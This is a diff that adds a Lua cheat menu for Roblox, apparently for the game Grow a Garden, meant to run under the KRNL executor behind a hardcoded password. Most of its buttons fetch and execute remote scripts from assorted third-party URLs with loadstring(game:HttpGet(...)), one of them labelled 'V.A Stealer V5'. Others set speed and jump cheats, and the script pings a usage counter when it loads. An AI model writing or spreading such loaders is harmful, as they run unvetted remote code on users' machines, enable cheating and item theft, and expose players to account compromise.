@@ -1,0 +1,539 @@
+--// V.A Hackz v14.5 Ultimate | KRNL-ready | Password Protected
+-- Added: new loaders (ZERO SCRIPT V5, V.A Pet Spawner v5, V.A Stealer V5, V.A HUB V1)
+
+if game.CoreGui:FindFirstChild("VA_Main") then
+    game.CoreGui.VA_Main:Destroy()
+end
+
+-- Services
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local player = Players.LocalPlayer
+
+-- Early sanity checks
+if not player then
+    warn("[VA Hackz] LocalPlayer is nil. Make sure you run this as a local/client script with KRNL.")
+    return
+end
+
+-- CONFIG
+local PASSWORD = "Kupal"
+local UNLOCKED = false
+
+-- Counter config (uses https://api.countapi.xyz)
+local COUNTER_NAMESPACE = "va-hackz"
+local COUNTER_KEY = "v14_5"
+
+-- Feedback link
+local FEEDBACK_LINK = "https://www.facebook.com/ryan.tanala.337976"
+
+-- GUI ROOT (parent to PlayerGui for better compatibility)
+local gui = Instance.new("ScreenGui")
+gui.Name = "VA_Main"
+gui.ResetOnSpawn = false
+local playerGui = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui", 5)
+if playerGui then
+    gui.Parent = playerGui
+else
+    pcall(function() gui.Parent = game.CoreGui end)
+end
+
+-- FLOATING BUTTON
+local floatingBtn = Instance.new("TextButton")
+floatingBtn.Size = UDim2.new(0,60,0,60)
+floatingBtn.Position = UDim2.new(0,20,0.5,-30)
+floatingBtn.BackgroundColor3 = Color3.fromRGB(30,30,30)
+floatingBtn.Text = "VA"
+floatingBtn.Font = Enum.Font.GothamBold
+floatingBtn.TextSize = 18
+floatingBtn.TextColor3 = Color3.new(1,1,1)
+floatingBtn.Parent = gui
+floatingBtn.Active = true
+floatingBtn.Draggable = true
+floatingBtn.ZIndex = 10
+
+-- MAIN FRAME
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0,420,0,640)
+mainFrame.Position = UDim2.new(0.5,-210,0.5,-320)
+mainFrame.BackgroundColor3 = Color3.fromRGB(25,25,25)
+mainFrame.Parent = gui
+mainFrame.Visible = false
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.ZIndex = 9
+
+local title = Instance.new("TextLabel", mainFrame)
+title.Size = UDim2.new(1,0,0,40)
+title.BackgroundTransparency = 0.5
+title.Text = "V.A Hackz v14.5 (Locked)"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 20
+title.TextColor3 = Color3.new(1,1,1)
+
+-- ===== USER COUNT LABEL & REFRESH & FEEDBACK =====
+local usersLabel = Instance.new("TextLabel", mainFrame)
+usersLabel.Size = UDim2.new(0.42,0,0,28)
+usersLabel.Position = UDim2.new(0.02,0,0,44)
+usersLabel.BackgroundTransparency = 1
+usersLabel.Font = Enum.Font.Gotham
+usersLabel.TextSize = 16
+usersLabel.TextColor3 = Color3.new(1,1,1)
+usersLabel.Text = "Users: --"
+
+local function safeDecode(json)
+    local ok, res = pcall(function() return HttpService:JSONDecode(json) end)
+    if ok then return res end
+    return nil
+end
+
+local function appendLog(txt)
+    logBox.Text = logBox.Text .. "\n" .. txt
+end
+
+-- we'll declare a placeholder logBox early so appendLog won't error before it's created
+local logBox = Instance.new("TextBox") -- will be re-parented and configured below
+
+local function updateCounter(hit)
+    spawn(function()
+        local url
+        if hit then
+            url = "https://api.countapi.xyz/hit/"..COUNTER_NAMESPACE.."/"..COUNTER_KEY
+        else
+            url = "https://api.countapi.xyz/get/"..COUNTER_NAMESPACE.."/"..COUNTER_KEY
+        end
+        local ok, resp = pcall(function()
+            return game:HttpGet(url)
+        end)
+        if not ok then
+            if logBox and logBox.Parent then
+                appendLog("[Counter] HTTP request failed: "..tostring(resp))
+            else
+                warn("[Counter] HTTP request failed: "..tostring(resp))
+            end
+            usersLabel.Text = "Users: ?"
+            return
+        end
+        local data = safeDecode(resp)
+        if data and (data.value or data.count) then
+            local val = data.value or data.count
+            usersLabel.Text = "Users: "..tostring(val)
+            appendLog("[Counter] Current users: "..tostring(val))
+        else
+            appendLog("[Counter] Unexpected response: "..tostring(resp))
+            usersLabel.Text = "Users: ?"
+        end
+    end)
+end
+
+local refreshBtn = Instance.new("TextButton", mainFrame)
+refreshBtn.Size = UDim2.new(0.25,0,0,26)
+refreshBtn.Position = UDim2.new(0.46,0,0,44)
+refreshBtn.BackgroundColor3 = Color3.fromRGB(80,80,80)
+refreshBtn.Font = Enum.Font.Gotham
+refreshBtn.TextSize = 14
+refreshBtn.TextColor3 = Color3.new(1,1,1)
+refreshBtn.Text = "Refresh Users"
+refreshBtn.ZIndex = 9
+refreshBtn.MouseButton1Click:Connect(function()
+    updateCounter(false)
+end)
+
+local feedbackBtn = Instance.new("TextButton", mainFrame)
+feedbackBtn.Size = UDim2.new(0.25,0,0,26)
+feedbackBtn.Position = UDim2.new(0.73,0,0,44)
+feedbackBtn.BackgroundColor3 = Color3.fromRGB(70,120,200)
+feedbackBtn.Font = Enum.Font.Gotham
+feedbackBtn.TextSize = 14
+feedbackBtn.TextColor3 = Color3.new(1,1,1)
+feedbackBtn.Text = "Feedback"
+feedbackBtn.ZIndex = 9
+feedbackBtn.MouseButton1Click:Connect(function()
+    local ok, err = pcall(function()
+        if setclipboard then
+            setclipboard(FEEDBACK_LINK)
+        end
+    end)
+    if ok then
+        appendLog("[Feedback] Link copied to clipboard: "..FEEDBACK_LINK)
+        local popup = Instance.new("TextLabel", mainFrame)
+        popup.Size = UDim2.new(0.6,0,0,28)
+        popup.Position = UDim2.new(0.2,0,0,74)
+        popup.BackgroundColor3 = Color3.fromRGB(25,25,25)
+        popup.BorderSizePixel = 1
+        popup.Font = Enum.Font.Gotham
+        popup.TextSize = 14
+        popup.TextColor3 = Color3.new(1,1,1)
+        popup.Text = "Feedback link copied to clipboard!"
+        popup.ZIndex = 60
+        spawn(function()
+            task.wait(3)
+            if popup and popup.Parent then popup:Destroy() end
+        end)
+    else
+        appendLog("[Feedback] Failed to copy link: "..tostring(err))
+    end
+end)
+
+-- CLOSE BUTTON
+local closeBtn = Instance.new("TextButton", mainFrame)
+closeBtn.Size = UDim2.new(0,30,0,30)
+closeBtn.Position = UDim2.new(1,-35,0,5)
+closeBtn.BackgroundColor3 = Color3.fromRGB(200,50,50)
+closeBtn.Text = "X"
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.TextSize = 18
+closeBtn.TextColor3 = Color3.new(1,1,1)
+closeBtn.MouseButton1Click:Connect(function()
+    mainFrame.Visible = false
+end)
+
+-- LOG BOX (properly create now)
+logBox.Parent = mainFrame
+logBox.Size = UDim2.new(1,-20,0,180)
+logBox.Position = UDim2.new(0,10,0,460)
+logBox.BackgroundColor3 = Color3.fromRGB(15,15,15)
+logBox.TextColor3 = Color3.new(1,1,1)
+logBox.TextSize = 14
+logBox.Font = Enum.Font.Code
+logBox.MultiLine = true
+logBox.TextWrapped = true
+logBox.ClearTextOnFocus = false
+logBox.TextXAlignment = Enum.TextXAlignment.Left
+logBox.TextYAlignment = Enum.TextYAlignment.Top
+logBox.Text = "[LOG] (Locked) Enter password to unlock..."
+logBox.ZIndex = 9
+
+local function appendLog(txt)
+    logBox.Text = logBox.Text .. "\n" .. txt
+end
+
+-- PASSWORD PROMPT
+local function createPasswordPrompt()
+    local modal = Instance.new("Frame", gui)
+    modal.Size = UDim2.new(1,0,1,0)
+    modal.Position = UDim2.new(0,0,0,0)
+    modal.BackgroundTransparency = 0.6
+    modal.BackgroundColor3 = Color3.new(0,0,0)
+    modal.ZIndex = 50
+    modal.Name = "VA_PasswordModal"
+
+    local frame = Instance.new("Frame", modal)
+    frame.Size = UDim2.new(0,320,0,160)
+    frame.Position = UDim2.new(0.5,-160,0.5,-80)
+    frame.BackgroundColor3 = Color3.fromRGB(35,35,35)
+    frame.BorderSizePixel = 0
+    frame.ZIndex = 51
+
+    local lbl = Instance.new("TextLabel", frame)
+    lbl.Size = UDim2.new(1,0,0,36)
+    lbl.Position = UDim2.new(0,0,0,0)
+    lbl.BackgroundColor3 = Color3.fromRGB(20,120,20)
+    lbl.Font = Enum.Font.GothamBold
+    lbl.TextSize = 18
+    lbl.TextColor3 = Color3.new(1,1,1)
+    lbl.Text = "Enter Access Password"
+
+    local input = Instance.new("TextBox", frame)
+    input.Size = UDim2.new(0.84,0,0,36)
+    input.Position = UDim2.new(0.08,0,0,52)
+    input.PlaceholderText = "Password"
+    input.Font = Enum.Font.Gotham
+    input.TextSize = 18
+    input.BackgroundColor3 = Color3.fromRGB(45,45,45)
+    input.TextColor3 = Color3.new(1,1,1)
+    input.ClearTextOnFocus = false
+    input.ZIndex = 52
+    input.Name = "PasswordBox"
+
+    local status = Instance.new("TextLabel", frame)
+    status.Size = UDim2.new(1,0,0,24)
+    status.Position = UDim2.new(0,0,0,96)
+    status.BackgroundTransparency = 1
+    status.Font = Enum.Font.Gotham
+    status.TextSize = 14
+    status.TextColor3 = Color3.fromRGB(255,120,120)
+    status.Text = ""
+
+    local btnApply = Instance.new("TextButton", frame)
+    btnApply.Size = UDim2.new(0.42,0,0,30)
+    btnApply.Position = UDim2.new(0.06,0,0,120)
+    btnApply.BackgroundColor3 = Color3.fromRGB(0,170,0)
+    btnApply.Text = "Submit"
+    btnApply.Font = Enum.Font.GothamBold
+    btnApply.TextSize = 16
+
+    local btnCancel = Instance.new("TextButton", frame)
+    btnCancel.Size = UDim2.new(0.42,0,0,30)
+    btnCancel.Position = UDim2.new(0.52,0,0,120)
+    btnCancel.BackgroundColor3 = Color3.fromRGB(170,50,50)
+    btnCancel.Text = "Cancel"
+    btnCancel.Font = Enum.Font.GothamBold
+    btnCancel.TextSize = 16
+
+    local function submit()
+        local text = tostring(input.Text or "")
+        if text == PASSWORD then
+            UNLOCKED = true
+            appendLog("[System] Password correct. Menu unlocked.")
+            status.TextColor3 = Color3.fromRGB(120,255,120)
+            status.Text = "Access Granted ✅"
+            task.wait(0.6)
+            frame.Parent:Destroy()
+            title.Text = "V.A Hackz v14.5 (Unlocked)"
+            mainFrame.Visible = true
+            logBox.Text = "[LOG] Unlocked. All features available."
+        else
+            status.TextColor3 = Color3.fromRGB(255,120,120)
+            status.Text = "Invalid password ❌"
+            appendLog("[System] Invalid password attempt.")
+            input.Text = ""
+        end
+    end
+
+    btnApply.MouseButton1Click:Connect(submit)
+    btnCancel.MouseButton1Click:Connect(function()
+        if modal and modal.Parent then modal:Destroy() end
+    end)
+    input.FocusLost:Connect(function(enterPressed)
+        if enterPressed then submit() end
+    end)
+
+    return modal
+end
+
+local function showPasswordPrompt()
+    if UNLOCKED then
+        mainFrame.Visible = not mainFrame.Visible
+        return
+    end
+    if gui:FindFirstChild("VA_PasswordModal") then return end
+    createPasswordPrompt()
+end
+
+-- DYNAMIC BACKGROUND
+local hue = 0
+local speed = 0.5
+RunService.RenderStepped:Connect(function(dt)
+    hue = (hue + dt*speed) % 1
+    mainFrame.BackgroundColor3 = mainFrame.BackgroundColor3:Lerp(Color3.fromHSV(hue,0.7,0.8), 0.08)
+end)
+
+-- BUTTON CREATION HELPER
+local function createButton(text, color, callback)
+    local btn = Instance.new("TextButton", mainFrame)
+    btn.Size = UDim2.new(0.9,0,0,40)
+    btn.Position = UDim2.new(0.05,0,0,120 + (#mainFrame:GetChildren()-12)*45)
+    btn.BackgroundColor3 = color or Color3.fromRGB(50,50,50)
+    btn.Text = text
+    btn.TextColor3 = Color3.new(1,1,1)
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 16
+    btn.ZIndex = 9
+
+    btn.MouseButton1Click:Connect(function()
+        if not UNLOCKED then
+            appendLog("[System] Feature locked. Enter password first.")
+            showPasswordPrompt()
+            return
+        end
+        callback(btn)
+    end)
+
+    local hoverTween, leaveTween
+    local offset = math.random()
+    btn.MouseEnter:Connect(function()
+        if leaveTween then leaveTween:Cancel() end
+        hoverTween = TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromHSV((hue+offset)%1,0.7,0.9)})
+        hoverTween:Play()
+    end)
+    btn.MouseLeave:Connect(function()
+        if hoverTween then hoverTween:Cancel() end
+        leaveTween = TweenService:Create(btn, TweenInfo.new(0.25), {BackgroundColor3 = color})
+        leaveTween:Play()
+    end)
+
+    return btn
+end
+
+-- MENU TOGGLE
+floatingBtn.MouseButton1Click:Connect(function()
+    if UNLOCKED then
+        mainFrame.Visible = not mainFrame.Visible
+    else
+        showPasswordPrompt()
+    end
+end)
+
+-- Chat toggle via LocalPlayer.Chatted
+player.Chatted:Connect(function(msg)
+    if msg and msg:upper():gsub("%s+","") == "VAHACKZ" then
+        if UNLOCKED then
+            mainFrame.Visible = not mainFrame.Visible
+        else
+            showPasswordPrompt()
+        end
+        appendLog("Chat toggle used (V.A HACKZ)")
+    end
+end)
+
+-- ====== EXTERNAL SCRIPT LOADERS (reordered + new ones) ======
+
+-- 1. Infinite Shackles (Grow-A-Garden)
+createButton("Infinite Shackles", Color3.fromRGB(150,200,100), function()
+    local ok, err = pcall(function()
+        loadstring(game:HttpGet("https://codeberg.org/twentys2/Scripts/raw/branch/main/Grow-A-Garden"))()
+    end)
+    if ok then appendLog("[Infinite Shackles] Loaded ✅") else appendLog("[Infinite Shackles] Error: "..tostring(err)) end
+end)
+
+-- 2. Fast Grow (GlennCheats)
+createButton("Fast Grow", Color3.fromRGB(200,120,180), function()
+    local ok, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/seji34343/glenncodes/refs/heads/main/glenncheats"))()
+    end)
+    if ok then appendLog("[Fast Grow] Loaded ✅") else appendLog("[Fast Grow] Error: "..tostring(err)) end
+end)
+
+-- 3. Duplicate Script (Anti_DupePET)
+createButton("Duplicate Script", Color3.fromRGB(120,200,220), function()
+    local ok, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowAGarden-Scriptt/GrowAGarden_ScriptHub/refs/heads/main/Anti_DupePET"))()
+    end)
+    if ok then appendLog("[Duplicate Script] Loaded ✅") else appendLog("[Duplicate Script] Error: "..tostring(err)) end
+end)
+
+-- 4. V.A Spawner v5
+createButton("V.A Spawner v5", Color3.fromRGB(100,150,250), function()
+    local ok, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/vahacks/Grow-a-Garden-script-/refs/heads/main/V.A%20Spawner%20v5"))()
+    end)
+    if ok then appendLog("[V.A Spawner v5] Loaded ✅") else appendLog("[V.A Spawner v5] Error: "..tostring(err)) end
+end)
+
+-- 5. V.A Pet Spawner v5
+createButton("V.A Pet Spawner v5", Color3.fromRGB(120,180,240), function()
+    local ok, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Free-Keyless-Script/RayfieldScriptV2/refs/heads/main/PetSpawnerV2.lua"))()
+    end)
+    if ok then appendLog("[V.A Pet Spawner v5] Loaded ✅") else appendLog("[V.A Pet Spawner v5] Error: "..tostring(err)) end
+end)
+
+-- 6. ZERO SCRIPT V5
+createButton("ZERO SCRIPT V5", Color3.fromRGB(180,140,90), function()
+    local ok, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/script-q/script/refs/heads/main/Script"))()
+    end)
+    if ok then appendLog("[ZERO SCRIPT V5] Loaded ✅") else appendLog("[ZERO SCRIPT V5] Error: "..tostring(err)) end
+end)
+
+-- 7. V.A Stealer V5
+createButton("V.A Stealer V5", Color3.fromRGB(200,100,100), function()
+    local ok, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/jazzedd/LuxiaxScript/refs/heads/main/Script"))()
+    end)
+    if ok then appendLog("[V.A Stealer V5] Loaded ✅") else appendLog("[V.A Stealer V5] Error: "..tostring(err)) end
+end)
+
+-- 8. V.A HUB V1
+createButton("V.A HUB V1", Color3.fromRGB(100,200,160), function()
+    local ok, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowAgardenScript101/II/refs/heads/main/Loader"))()
+    end)
+    if ok then appendLog("[V.A HUB V1] Loaded ✅") else appendLog("[V.A HUB V1] Error: "..tostring(err)) end
+end)
+
+-- 9. Nexus Admin Panel
+createButton("Nexus Admin Panel", Color3.fromRGB(250,100,150), function()
+    local ok, err = pcall(function()
+        loadstring(game:HttpGet("https://pastefy.app/uG9YKxzp/raw"))()
+    end)
+    if ok then appendLog("[Nexus Admin Panel] Loaded ✅") else appendLog("[Nexus Admin Panel] Error: "..tostring(err)) end
+end)
+
+-- WalkSpeed / JumpPower
+local defaultWalkSpeed = 16
+local defaultJumpPower = 50
+local walkSpeedEnabled = false
+local jumpPowerEnabled = false
+local walkSpeedValue = 100
+local jumpPowerValue = 200
+
+createButton("WalkSpeed: OFF", Color3.fromRGB(100,180,100), function(btn)
+    walkSpeedEnabled = not walkSpeedEnabled
+    local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+    if walkSpeedEnabled then
+        if hum then hum.WalkSpeed = walkSpeedValue end
+        btn.Text = "WalkSpeed: ON ("..walkSpeedValue..")"
+        appendLog("[Speed] WalkSpeed enabled: "..walkSpeedValue)
+    else
+        if hum then hum.WalkSpeed = defaultWalkSpeed end
+        btn.Text = "WalkSpeed: OFF"
+        appendLog("[Speed] WalkSpeed restored to default: "..defaultWalkSpeed)
+    end
+end)
+
+createButton("JumpPower: OFF", Color3.fromRGB(180,100,100), function(btn)
+    jumpPowerEnabled = not jumpPowerEnabled
+    local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+    if jumpPowerEnabled then
+        if hum then hum.JumpPower = jumpPowerValue end
+        btn.Text = "JumpPower: ON ("..jumpPowerValue..")"
+        appendLog("[Jump] JumpPower enabled: "..jumpPowerValue)
+    else
+        if hum then hum.JumpPower = defaultJumpPower end
+        btn.Text = "JumpPower: OFF"
+        appendLog("[Jump] JumpPower restored to default: "..defaultJumpPower)
+    end
+end)
+
+-- Auto-Grow
+local STATE = { autoGrow = false }
+createButton("Toggle Auto-Grow", Color3.fromRGB(100,150,50), function(btn)
+    STATE.autoGrow = not STATE.autoGrow
+    btn.Text = STATE.autoGrow and "Auto-Grow: ON" or "Auto-Grow: OFF"
+    appendLog("Auto-Grow "..(STATE.autoGrow and "Enabled ✅" or "Disabled ❌"))
+end)
+
+task.spawn(function()
+    while true do
+        task.wait(0.6)
+        if STATE.autoGrow and UNLOCKED then
+            local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                local p = Instance.new("Part")
+                p.Name = "VA_Plant"
+                p.Anchored = true
+                p.CanCollide = false
+                p.Size = Vector3.new(0.2,0.2,0.2)
+                p.CFrame = hrp.CFrame * CFrame.new(0,0,5)
+                p.BrickColor = BrickColor.new("Lime green")
+                p.Parent = workspace
+                for i=1,12 do
+                    if not p.Parent then break end
+                    p.Size = p.Size + Vector3.new(0.4,0.4,0.4)
+                    task.wait(0.03)
+                end
+                task.spawn(function()
+                    task.wait(8)
+                    if p and p.Parent then p:Destroy() end
+                end)
+            end
+        end
+    end
+end)
+
+-- On load: increment counter and fetch current value
+spawn(function()
+    local ok, err = pcall(function()
+        updateCounter(true) -- increment
+    end)
+    if not ok then
+        appendLog("[Counter] Failed to increment: "..tostring(err))
+    end
+end)
+
+appendLog("V.A Hackz v14.5 Ultimate (updated loaders) loaded. Enter password to unlock.")
